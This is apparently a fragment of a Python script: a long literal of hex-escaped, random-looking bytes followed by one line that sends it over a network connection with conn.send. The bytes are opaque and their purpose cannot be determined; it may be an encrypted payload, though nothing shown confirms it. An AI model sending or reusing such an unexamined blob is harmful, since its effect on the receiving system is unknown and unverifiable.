\x41\xb8\x33\x45\xd1\x33\x04\x69\x16\x22\x6b\x0f\xaa\x74\x0f\x61\x90\x53\x71\x45\x6c\xce\xb7\x14\x9c\x53\x2e\x20\xf5\xd9\x1b\x0c\xf3\xd5\x00\xfc\x2a\x0d\xfa\xbd\x3f\x4f\xb7\xa1\x7b\x38\x2d\x46\x84\xd6\x63\x90\x05\x45\xb6\xd8\x20\x1a\x25\x78\x37\x62\x78\x77\x74\x5b\x14\x4c\xfe\x52\x11\xd4\x5e\xcc\x82\xb0\xd7\x1d\xe1\x02\xed\x23\xb8\xa8\x20\xc6\x48\x60\x87\xba\x40\x20\x06\xfd\x8f\xdb\xe3\x12\x3d\xd9\x51\x97\xf8\xc6\x68\x98\x09\x0d\xff\x37\xec\x53\x61\x91\x6b\x86\xdb\xe6\x3a\xd9\x07\x0a\xff\x87\xaf\xd1\xbe\xfd\xa0\x44\xf7\x77\xba\x95\xcd\x69\xd9\xad\x1c\x85\x79\xea\x30\x7d\x8f\x19\x20\xfb\x23\x3d\xca\xd1\xeb\x5a\x4a\x2d\x38\x1c\x7b\xc9\x70\x7e\x68\x32\x99\x9f\x9d\x06\x89\xaf\xfd\x5c\x32\x80\x7f\x83\xfe\x24\xae\xe2\xbe\x01\x65\xf5\x5c\xea\xc4\x36\x66\x83\x48\x53\x3e\x51\x47\x59\x26\x61\xd0\xa3\x1f\x13\xdb\x85\x65\xc3\x33\x75\x41\x88\x15\xb3\x45\xbe\x51\xf2\x10\x82\x0f\x83\x92\x57\x68\xc9\x1b\x31\x30\x69\x03\x1f\x08\xb4\x9d\x87\x1b\xd0\x59\x40\x2d\xd3\x84\x2e\xac\x79\xa2\x6e\xda\x71\x18\x38\x8a\x20\x47\xa8\x76\x4d\x8d\xac\xe3\xe7\x21\xb6\x12\x5e\xc4\xa1\x30\x4d\xd0\x8d\x56\x9e\x6c\x1d\xe3\x9b\x9e\x51\xc8\xf3\xe6\xfe\x1d\x06\x50\x72\x55\x00\x49\x5f\xb5\xfe\x22\x08\x57\xe4\x1e\x08\xd4\x18\x48\x89\x09\x19\xe8\xd6\x4f\x4d\x20\xef\x94\xf6\x15\x9d\x0d\xd1\xb6\x05\x78\x2b\x6d\x63\x8d\x34\x24\xe7\xd3\x90\xb2\x10\x7f\x04\xcd\xc1\x71\x5b\x28\xdc\x79\xcf\xb2\x29\x57\xdf\x3c\xbd\xbe\x8e\x1e\x93\xb4\x94\x51\xa3\x47\xcb\xb3\xed\x3c\x6b\xbf\x4a\xf8\x74\x46\xb7\xc0\xc8\xe4\x98\x09\xb6\x7e\xde\xd7\x42\x65\x27\x3d\x0f\x5b\x1f\xf5\x1c\x52\x34\xda\xfd\x1d\x19\x43\x64\xa3\x0a\xf4\x57\x2f\x91\xce\xf6\xcf\x03\x69\xcf\x3f\xf0\xe8\xef\xbb\x29\x49\x35\xa9\x44\x87\x95\x59\x2b\x84\x79\xcf\xdb\xf7\x31\xcd\x26\xf6\xbd\x11\x0d\x1b\x62\x57\x82\xc6\xe7\x36\x68\xcb\xa3\xed\x78\xf3\x10\x17\x91\x20\xb5\x70\x80\x1a\x17\xd0\xd7\xba\xee\x22\x68\xde\x96\xcd\xd0\x83\x72\xa1\x25\xb6\x9e\xa6\xe4\x2c\x92\x13\x4c\x94\x6f\x55\x6f\xbc\x25\xb0\xc9\x12\x2a\x1b\x87\x3e\xfd\xb0\xa8\x2a\x11\xa0\x44\x90\x86\x39\x92\x55\xc0\xbb\x0e\xc5\x38\x9e\xd1\x54\x30\xc0\x10\xe2\xa5\x24\xa4\x4d\x54\x40\x8e\xbe\x79\xc6\x0f\x26\x01\x96\x5c\x18\xfc\x4a\x4b\x9c\xe7\xe1\x7d\x45\x66\x42\x30\x2f\xa3\xde\x8e\x02\xc7\xf1\x19\x6f\x29\x7b\x50\xdb\xbf\x8b\x26\x1c\x52\xee\xec\x92\x58\x6a\x01\x82\xe3\x7b\x9d\xd3\xef\x72\xd2\xf2\xeb\x87\x32\x88\x00\x8d\x71\xce\xe1\x47\xf7\xb1\x3e\x96\x8a\x5d\x75\x69\xfb\x00\xfb\x47\xe2\xe4\xe3\x2e\xbb\x26\xeb\x13\x2e\x74\x03\x9b\xf2\xee\x96\xa9\x46\xc9\xa8\x5c\xa6\x08\x6e\x61\x38\xf4\x0f\x24\xa1\x8d\x35\x59\x18\xe7\x19\xed\x6f\x41\xdc\x28\x85\x42\x13\xd6\xae\xda\x1e\xb2\x8c\x31\x0a\x78\xe7\x76\x4e\x38\x0e\x03\x30\xb7\xe4\x97\x49\x9d\xca\x92\x73\x97\x58\x3c\x90\x5a\x07\xd0\x75\xc7\x4f\x1e\x58\xa3\x02\x56\xb1\xf9\x86\xa9\xd3\xf8\xc6\xc8\xd7\x0e\x9d\xa7\xe1\xcc\x6c\x15\xee\x2d\xc2\x27\x3d\x21\xb5\x82\x1e\x6d\xf0\xcb\x3a\x72\xdc\x5a\x6f\x76\x22\x42\xd7\x97\xc6\x04\x54\x14\xf6\xb1\x92\x6c\x69\xdc\x27\xb7\xcd\x62\x98\xee\x10\x0e\x9c\xa8\xd4\x3e\xdf\x5a\xc1\xcd\xe7\x21\xa9\x82\x17\xaa\x04\x9a\x1b\x22\x90\x82\x08\x28\x0a\x5d\xaa\xb4\x2c\xbe\x10\x5c\xfd\x32\x77\x76\x97\x1e\xa2\xc8\xa6\xca\xe3\xfb\x51\x46\xc3\xef\xe6\x9b\x5d\x83\x43\x04\x6e\xad\x48\x39\x58\x64\xb9\x57\xba\xd1\xa2\x5e\x90\xf7\x80\x15\xba\x78\x32\x35\x20\x3c\xcb\xcc\x1f\xc4\x18\xa4\x4e\x15\x81\x69\x5e\xeb\xae\x39\x7e\x87\xf2\x82\x22\x29\xa6\xf0\xc4\x61\xca\x01\x7a\x7f\xfe\x86\xd2\x39\x33\x1b\x4f\x30\xd3\xdd\x16\x64\xf6\x50\xb3\x6f\x8e\x42\xb1\xfc\x73\x8b\x68\xf0\xfe\x14\x13\x92\x21\x4d\xfd\xa0\x11\x3c\x25\x16\x33\x3f\xca\xec\x42\xd8\xbe\xbf\xc8\x32\x17\xad\xac\x32\x4c\x7d\x7a\xc0\x34\x8f\xcc\xc1\x4d\x29\x4b\x3b\x08\x7a\x6b\x36\x7b\x25\x7c\xed\x60\x55\x0d\xcf\x8b\x76\x39\x8d\xba\x50\xe6\xc9\x58\x80\xbd\x9d\xf0\x62\x1a\x4e\xae\xa0\xea\xa2\xe8\x8d\x42\x50\x62\x0c\x1c\xbd\xa5\xa1\xf6\x9d\x10\x49\xf2\x8d\xc4\x3f\xf3\x1c\xc0\xce\x18\x25\x71\xe2\xe5\xa6\x46\x79\x2e\x21\x53\xd9\xe1\xd7\x83\x3f\x57\x54\x32\x75\xe1\x29\x22\x8c\xa2\x74\xe1\x07\x0d\xb3\x48\x51\x83\x0a\x17\xf3\x75\x68\x5b\xa9\x8f\xef\x06\xc2\xda\xb4\xde\xad\xe4\x9e\xed\x75\x13\xa5\xfd\xe3\xc8\x35\x87\x62\xf9\x1c\x80\x1a\x15\x07\xd8\x6b\xc6\x6d\xa2\x1a\x0f\xf6\x2d\x11\xfc\x65\x35\x96\xa6\xb4\x5b\x9d\x18\x9d\x8d\xd2\x6d\x65\x86\xf8\xae\x88\x7f\x81\xbc\x3a\xc3\xc5\x6f\xb0\x6f\x33\x7f\xcc\xc5\x29\xf1\x9c\x9c\x04\xd9\xee\x67\x51\x1f\xab\xe2\x3c\xaf\xaa\x85\x9c\xd1\xf8\x37\xca\x35\x77\x26\xa5\x5e\x1e\xf6\x39\xbb\xe7\xe0\x3e\xe1\x4f\x55\xf4\x29\xbb\x64\xc9\x7b\x21\x37\x15\xa9\xde\x6b\x64\x54\xb6\xb4\xf8\xc1\x0a\x87\x96\xa0\x8d\xc1\xa6\x2c\xea\x3a\xdf\x26\x90\xb0\x96\x01\x67\xaa\xda\x33\x7d\x4e\x6a\x83\x2e\xee\xcb\x07\xef\x9e\xfa\xac\x37\x5b\xa3\xb3\x9c\xab\x23\x3d\x6a\x02\x3c\x3e\x79\x05\x36\x2f\xbd\x7a\xc1\xc9\x6b\xf2\x5f\x24\x22\x9e\xe9\x24\xe7\x09\x79\xc0\xea\xe2\xa1\x11\xbb\x02\xc1\xa8\x36\x3b\xf8\x7b\x0b\x94\xd0\x2b\xdc\xb3\x4b\x13\xdf\x8a\xd4\xcb\x4d\x0d\x4e\xc8\x77\xb3\x1d\x93\xfa\x0f\xd5\x0f\x38\xa6\x81\x11\x43\x5c\xc8\xef\x19\xff\x55\x38\x20\x64\x3c\x59\xec\x4c\xf8\x81\x89\x11\x3f\x01\xa3\xf5\xce\xf6\x56\x82\x41\xa5\x09\xda\x45\x9f\xcf\xff\xe8\x8e\xa6\x55\xad\x08\xed\x7e\xa9\xe1\x7c\x52\x19\xf0\x72\x65\x52\x3d\x60\xcb\x7f\xe5\xee\xa0\x95\x9c\x6d\xd8\xcd\xfa\xfd\x20\x38\xf1\x33\x5c\xa8\x1d\x6e\xea\x8e\x87\xe6\x98\x73\x1d\xb8\xd7\x88\xec\xdd\x54\x94\x5f\x84\x53\x83\x68\x08\x75\xe9\x70\xc2\x31\x8f\x1a\x77\x6a\xea\x0e\x71\x86\x3a\x26\x12\x28\x71\x4a\x29\x02\x12\xd4\x19\x85\xf2\x42\x0d\x22\x31\x71\x33\xa7\xc1\x79\x41\x46\x6b\x3d\x52\x17\x65\x0e\xd7\x9b\xb4\x04\xdf\x96\x8f\x0f\x46\x75\xb8\x58\x69\x4e\x5e\x95\x50\xe7\x41\xea\x83\x5c\x7b\x58\xc5\x51\xc0\xf4\xdd\xb2\xa2\x4c\x11\xf0\x61\x0a\xab\x3b\xa6\x27\x73\x24\x92\xe4\x32\xf4\x6d\xb2\x21\xee\x4f\x0d\x20\x89\x53\x33\xaf\x78\x9e\x6c\xdd\xa1\xea\x4e\x95\xaf\x57\x6d\x4a\xe6\x64\x6c\xa8\xa1\xe1\x11\x25\xd7\x19\x13\xcc\x48\xaa\x75\x87\xc6\x05\x28\xeb\x3b\xde\x38\x65\x0e\x30\x4b\x8d\x33\xcf\x73\xb2\xf8\x17\x54\xf0\x96\x9f\xf2\x25\x4c\xce\x56\x21\x10\x0a\xef\x15\xac\xd9\x1a\x10\xf3\xae\xc3\xc5\xbc\xdf\xef\x73\xd5\x20\xd8\x31\x22\x60\x3a\xc3\xe3\x95\x6f\x93\x90\xe8\x0d\x5f\x0c\xee\x85\xfb\xda\xd3\xad\x70\xbc\x02\x53\xed\xe6\xec\x71\x63\x16\x18\x81\x61\x67\x50\x6b\xd5\x83\xbc\x8f\xeb\x7f\x93\x92\x4e\x5d\x6c\x19\x09\x55\x2a\xf7\x64\x91\x99\x16\xda\xad\xbd\x02\x72\xb7\xc4\x48\xb5\x70\xd3\x4a\x0f\x3a\x22\x41\x38\xd2\x06\xa5\x20\x69\xdc\xb3\xb8\x74\xcb\xc5\xed\x42\x5f\x3e\x61\x07\xc2\x96\x17\x4b\xc2\x1f\x1f\xf7\xad\x47\xb9\xd7\x2f\x9b\x95\xd6\x0b\x97\xfb\xd7\xf4\x34\xf6\x3d\x88\xfa\xf5\x5f\xe5\x6a\x2c\xfb\x74\x66\x01\x96\x73\x46\xf0\xf8\x86\x29\x14\x5e\x30\x7f\x48\x3d\x3c\xb1\xde\xa3\x4d\x73\x53\xda\xd4\x8f\xf8\xda\x7e\x12\x17\x8a\xae\xbc\x45\xb8\xa1\xe8\xc0\x8b\x7b\xe5\xae\xe7\xf4\x09\xf9\x83\xfa\x86\xfa\xc8\xd9\xf5\x22\x0d\x2f\xc5\xc4\xac\xb0\x85\xee\xf3\x80\x97\xe3\x02\xee\x3c\x8b\x31\xe0\x3c\x27\xa0\x72\xdc\x08\xfb\x4e\xeb\x75\xa9\xf5\x77\x09\xa6\xdb\xb3\xab\xca\x1e\xbf\x2d\xf2\x74\x7a\x30\x71\x9d\xc9\x4e\x91\x78\x8c\x35\xda\x9e\xf1\xd5\x76\x98\x10\x46\x3f\xb8\x3a\xff\xec\xa4\x71\xa2\xbb\x14\xdc\x76\x03\xa1\x6b\xa9\x59\xd8\x66\xed\x3f\x6b\x46\xe2\x3b\x15\xf7\xfc\xac\x1d\x2d\xce\x9c\x2b\x38\x53\x87\x6c\x03\xd1\x50\x0d\xcb\xa1\xde\xbb\x63\x71\x60\x6f\x40\x49\xc5\x68\xd2\x9b\x8d\x2b\xd4\xad\x7c\x9e\x18\xb2\xdc\x8a\xb7\x3d\x33\xbf\x5c\x90\x11\xfe\x6d\xd6\x9a\xa7\x55\x87\xf9\xda\xe9\x24\xa8\x42\x38\x06\x61\x48\x34\xa0\x09\xe8\x90\x9c\x12\xf0\xdf\x22\xe4\x12\xac\x18\x56\xfd\x38\x81\xfe\xdd\xf9\xa1\x21\xab\x20\x27\x25\x0f\x24\x9c\x2d\x04\xdb\xe5\x25\x20\xfa\xda\xfe\xc6\x8f\xf1\x99\x29\xe1\xd1\x32\x7b\x54\xe5\x01\xca\xad\xed\xcd\x4f\xb6\xd0\xdd\xfa\x70\xa0\xd4\x9f\x07\xb6\xd0\xc1\x09\x79\x29\x51\x48\x57\x5c\x7b\x3b\x6e\x45\x3b\xb3\xf5\xeb\x63\x47\xa4\xd4\x10\x71\x27\xf4\x2b\x8d\xc7\x16\xfd\xc9\xd7\x60\x96\x33\x22\x41\xc1\x5e\xbc\xaa\x83\xd0\x1f\xc1\x7b\x4f\x55\xe9\x91\x7e\x9e\x01\x2d\x78\x13\xdc\xff\x77\x61\x51\x15\x55\x61\xa2\xb3\xe8\x21\x7a\x7c\x72\xb0\xcb\x55\xec\xa3\x49\x00\x70\x2b\xdb\x8e\xe4\x3a\xbc\x70\x54\x2d\x34\x8a\x72\xd6\xb3\x3e\x12\xaf\x82\xc1\x21\x83\x67\xa6\x8d\xe6\x93\xf1\x12\x61\xe4\xff\x8d\xbc\xb8\x17\xa9\x72\x55\xb7\x7c\x32\xa6\x8b\xc3\x7a\xef\x57\xb5\x59\x4a\xc9\x1c\xee\xfd\x78\xf6\x87\x32\x02\x1c\xd3\xdd\x6b\x9e\xa1\x06\xd8\x00\xbd\xe8\xe4\xe1\x27\x43\xba\x71\x86\x38\xda\x5b\xb5\x01\xf2\x4d\x93\x3f\xc8\xd4\xaa\xb4\x2a\x79\x59\x5b\xc0\x14\xb3\xe6\x1a\x0d\x4e\x77\x9f\xfb\x67\x1e\x12\x71\x16\x07\x06\xd6\x1c\xb1\x78\x9d\xf5\xe7\x46\xa4\x22\xaf\x89\xd6\x8d\x17\xc7\xe0\x7e\xd0\x83\xd2\xa0\x17\x6a\xc1\x4f\xef\x6a\xe2\x62\xfe\xbd\x8b\x70\x8c\x77\xf0\xd7\x4d\x25\x93\xb1\xf8\xd7\x46\xd6\x14\x87\x21\x11\x44\x5f\xa6\x7e\xb7\x83\x75\x14\x2f\x77\xb1\xdf\x6b\x23\xbe\x4f\x14\xc2\x60\x78\x47\xf5\xc7\x4c\x5b\xd8\x4f\xe4\xb4\xbf\xc3\xbc\xae\x11\x1d\x22\xe8\xf3\x59\xde\x47\x5a\x9f\x39\xd0\x63\x7c\xa0\x55\x49\xed\xcb\xaa\xa0\xd0\x16\xf4\xaa\x0b\x16\x06\xd6\x15\x27\x3a\xe8\x85\x6f\x14\x9d\x76\x41\x2e\xb5\x2d\x7d\x4e\x09\xf3\x94\x6f\xd9\xc9\x1e\x68\x9f\xc7\x32\x97\x10\x1d\x31\x87\x36\x02\xfe\x75\x36\x12\x92\x2d\x99\xea\xc3\x62\x1d\xf7\x72\x72\x44\x27\x13\xf3\xdb\x25\x9a\x8c\x54\x5f\xb5\x72\x75\xb8\xaf\x9b\x9a\x38\xf4\x06\x7d\x9b\x52\xe0\x26\x1b\x23\x8f\xf2\x5d\x2b\x49\xef\xb5\x41\x3b\x16\xbc\x2a\x17\x31\x92\xff\xb1\x0f\x30\x7b\x1c\x94\x8b\x49\x0d\x05\xa3\xb9\x59\x10\x57\xc3\xe3\x76\xb0\x57\x6f\xb0\x70\x4a\x0f\x8f\xea\x83\x8a\xf4\xcc\xb4\x29\x5b\xc3\x61\x8b\x81\xda\x43\x5f\xfb\x4d\x61\x6c\xb0\xd9\x07\xb5\x81\x46\x03\x6f\xbd\x21\x96\xbf\xa4\xea\xae\xaf\x35\x26\x3f\x8f\x67\x70\xdc\x4a\x6e\x41\x99\xe1\xb0\x5e\xad\x43\x8a\x86\xed\xd7\x22\xf7\x08\xb3\x5e\x96\x12\xd5\x05\xa1\x9b\x11\xbf\xad\xe8\x6d\xdc\xed\x83\x6b\xfb\xd0\xab\xbe\x72\x81\x3e\x90\x98\x13\x0c\x0a\xe3\x40\x46\xd6\x73\x5f\x59\x99\x2b\x87\x37\x84\x65\x4a\xc5\x4a\xd9\x87\x84\x01\x3b\x10\xa4\xe9\x25\xe4\x02\x65\xa2\x80\xbf\x9d\x4a\x52\x26\x83\x22\xce\xda\x0d\x1f\x16\x39\x4f\xcb\x00\x3e\xdf\x23\xa3\xdf\xc0\xd3\x2d\x88\x89\xb4\x3b\x5c\x2e\x66\x26\x76\x9a\x2e\xc1\x8b\xdf\x7c\x95\x7b\x8e\x52\x06\xe7\xae\xcd\x5a\x0f\x28\x92\x14\x58\x6c\x8c\xf6\x54\x33\x40\x05\xd4\x7b\xfa\xbc\x0f\xae\x87\xfe\x50\xd0\xa7\x53\x13\xfc\x9a\x22\xde\x94\x0d\x72\x00\x2c\x4c\x91\xb4\x82\x0e\xdb\x24\xda\x81\xc7\x59\xec\x2d\x5d\xb3\x9c\x07\x94\x47\xbf\x3c\xbc\xc6\xfc\x36\x4c\xfb\x2d\x1d\xfc\x72\xcf\x97\x5b\xfd\xe8\x17\xce\x16\x93\xf3\x29\x27\xda\x6d\x93\x78\xc6\x31\x51\x49\xb6\xaf\x56\xc5\xfb\x6e\xc2\x24\x1d\x01\x3b\x82\xbe\x79\xd0\x76\xc8\x50\xe9\xac\x5e\xa2\x78\xe9\xb3\x18\xaf\x4f\x90\xe7\x4d\xf4\xbb\x8d\x42\x73\x65\xeb\xbe\xfd\x75\x00\xcc\xcf\x3c\xd8\x5e\x36\x24\x2d\xd1\x4d\xe9\x0b\x08\x11\x16\x63\xb1\x39\x1c\x68\x7c\x5d\x41\x04\x1c\x05\x84\x8a\x89\x0d\x12\x51\x96\x76\xb2\xcf\x06\xd0\xa8\x63\x86\x4b\x8d\x1c\xe1\xc3\xe4\x6a\x5d\x23\xa5\x98\xc8\xa3\x63\xb5\x83\x23\xc3\xa2\xac\x72\xdd\x82\xd2\x3e\xd8\xf3\xe8\x88\xca\x32\x17\xd8\xcc\x4d\xdd\xd3\x20\x37\x8f\x74\x5c\xc6\x72\xde\x04\x8b\x8b\x41\x19\xcc\x77\x92\x38\x4f\x3c\x6b\x33\x7e\xa4\xfc\x82\xea\x02\x5b\x50\x98\xf4\x26\x4e\x6f\xbd\x92\x53\x72\x3c\xed\x29\x2c\xf3\xba\x2a\x94\x69\xd1\x92\xc8\x09\xde\x24\xbe\x4a\xe5\x0c\x6c\xbe\x76\xef\x28\x9d\xc5\xe7\x85\xbb\xfe\xbc\x77\xd3\x99\x96\x66\xc3\x1b\x00\x05\xc5\xc3\x3d\x53\xb1\x78\x36\x73\x1f\x6f\x9d\xc1\x3a\x98\x85\xf6\x65\x2e\x59\x44\xcf\xb8\x53\xc0\x38\xfd\xd7\x4a\x9b\x41\xe4\xe9\x9d\xb6\x8e\x15\xf2\x15\x2c\x55\xe7\xc2\xd1\xed\x12\x4d\x95\x29\x10\xa5\x07\x5e\xcf\x5c\x95\x63\x3b\xa2\x8b\xf0\xd9\x6e\x58\x63\x18\xde\x5c\xfc\x69\xd8\x38\x66\x5c\x72\x33\x78\xfd\x87\x39\xd3\xca\x0d\xb4\x80\xc6\xfe\x9a\xfe\x61\x93\x4e\x91\x90\x34\x7e\x09\x6b\xf2\x67\xf2\x79\x92\xcb\x6b\x1b\x10\xb3\x3b\x2d\x8f\x55\xd9\xe1\x54\xea\x7b\x36\x67\x91\xcf\xd2\x6f\x25\xaa\xad\xa1\x8e\x2b\x16\xdd\xef\x21\xe3\x9d\xb1\x5e\xaf\xaa\xd8\x62\x45\xd1\x7f\x90\xb3\x8c\x34\x0d\x80\x6b\xef\x62\x98\x42\xab\x87\x09\xae\x9c\xc5\xa6\x09\x40\x04\x87\xa0\x14\xba\xd6\x59\x5b\xf7\xbd\xc5\xb1\xc4\x35\x8b\xe6\x47\x83\x32\xf4\x94\xfd\x39\xd7\x46\xc6\x37\xfa\x7c\x5f\x9a\xaf\x3e\xb4\xa0\xb4\x43\x07\x46\xa7\xbb\xee\x36\xd6\x28\x06\xf3\x22\xf6\xcd\xbe\x3a\x97\x28\x6e\x76\xb1\x43\xc6\xc7\xb8\x86\xa2\x5b\xe1\xf6\x65\x3a\x30\x46\x90\x67\x88\x83\x8f\xdb\xa0\x68\xe5\x3f\x14\x76\xbc\x6e\x7d\x70\x8f\x33\x35\xfe\xeb\xb3\x81\xe3\x26\x1c\x30\x86\xb0\x1f\x19\x1e\xdc\x73\x50\x3b\xe5\xb3\x52\xbe\x64\xd2\x09\x4e\xa5\x4d\x2a\x8c\xf0\xa9\xfe\xac\x2b\xde\x54\x93\x99\xd8\x71\xa1\x6d\x6d\xff\xb5\x97\x3f\x0c\xfe\x02\x95\xfb\x9c\xee\xfb\x5b\xc2\xd7\x05\xb8\x3c\xcd\x09\x13\xe3\xea\x70\xee\x5c\x60\x9e\x57\xe1\x4d\x70\x26\xc2\xa3\x5a\x5c\x90\xc4\x53\xb6\x83\x7f\x3e\x5c\x37\xe9\x6a\xbb\x91\x69\x92\x40\xb5\x5b\x15\xbf\xc6\x6b\xd3\xce\xd5\x7c\xa7\x97\x37\x49\xbe\x30\xa2\xc0\x21\xf7\x1d\x57\x0a\x49\x51\x0d\x6a\xfa\x50\x03\xd6\x29\x08\x83\x9a\xf4\x46\x87\x1c\xa9\x6f\x27\x01\x2c\x6c\x98\x1c\x3a\x9e\xbd\xe6\xe0\xa9\x23\x6c\x45\x1d\x87\x03\xac\xae\xfe\x7a\x6c\x7d\xcb\x43\xad\xd7\xcd\x66\x62\xe6\xe4\x37\x4f\xff\x9a\xf0\x35\x77\xaa\x20\x9f\x4c\xd2\x60\x34\xd8\x85\x24\xbe\xa9\x3f\x00\xbd\x23\xde\x0a\xa7\x08\x95\xe5\x91\xc7\x27\x6f\x6c\x42\xaf\x0c\xd1\xfd\x57\x1f\x1d\xbb\x62\x8d\x1f\x0f\x8b\xbe\xaf\x1f\xa0\x59\x2e\x65\xf0\x02\x81\x1d\x4c\x13\x5f\x7c\x13\x2d\x6f\x37\x68\x73\x1a\xd9\xc2\xf5\x1f\xbf\xe8\x63\xb1\x8e\x45\x3e\xc0\x13\x16\x64\xbc\x10\x6b\x16\xcd\xfd\xb6\xc5\xe8\xe6\x0b\x30\x3f\xd3\xf4\xd8\xcf\x20\x76\x72\x2e\x65\xb3\x87\xcd\x94\xc7\xa9\x53\x47\x8c\xef\xe8\xb6\x1f\x66\x8e\x58\xb7\xa8\x7f\x8c\xbe\x5f\x14\x4f\x98\xe2\x07\x15\x40\x66\x2d\x92\xe4\xb3\xcb\x76\x6f\xa1\xd6\x63\x1d\x03\x35\xbd\xd5\x79\x26\xb5\x19\xde\xf8\xcf\x7e\xe4\x70\xd2\xe1\xf3\x15\xe5\x19\x50\xf7\xc8\x89\x09\x9e\x52\x7e\x19\x5f\x23\x56\xf4\xd2\xf7\x48\xe9\xcb\x47\x09\x12\x9b\x22\xe2\x5a\x83\xc2\x49\x28\x12\x41\x25\x31\x42\xf1\xe8\xf0\xb4\xa2\x74\x61\x6f\x29\xaa\x88\x81\xf5\x3f\x5b\xba\x6d\x0d\x7c\x71\x22\x28\xc1\x61\x0c\x4b\x73\x2b\xac\x53\x7c\xc3\xe6\x6b\xa8\xa4\xa8\x94\xf2\xb9\x1d\x92\xda\xdb\x7e\x91\x79\x4b\x02\xa6\xcd\x21\xb2\xaa\x78\x8a\x65\x9f\xd9\xb0\x48\xc3\x7c\xfd\x6f\x5c\xf9\x4f\xbd\x30\x8d\x7e\x9b\xe2\x67\xbb\xc5\x94\x46\xf9\x3e\x39\x8c\x40\xf0\xa6\x0b\x80\xda\x76\x47\x85\xc1\x94\xe3\xe7\x42\x19\x46\xb1\x7f\x34\x47\xe0\x50\xe2\x62\x75\x95\x8c\xb3\xb6\x4b\xea\x16\xe3\x74\xb3\x09\xde\xbb\xa8\xca\xba\x4b\xbb\x70\xb5\xdc\x80\xeb\x03\x8a\x60\x9e\x42\x0a\x7e\xaf\x5e\x28\xbf\xf2\xae\x90\x8d\xda\x81\xbc\x1f\x74\x25\x06\x56\xd7\x72\xd9\x18\x66\x98\xb4\x85\x1f\xb1\x4b\xfc\x14\x44\x3c\x4a\x8d\xca\x58\x3e\x64\x01\x26\xf7\xbd\xa0\xaf\x95\xbb\x18\x2c\xe6\xf6\x90\xae'
        conn.send(data.encode())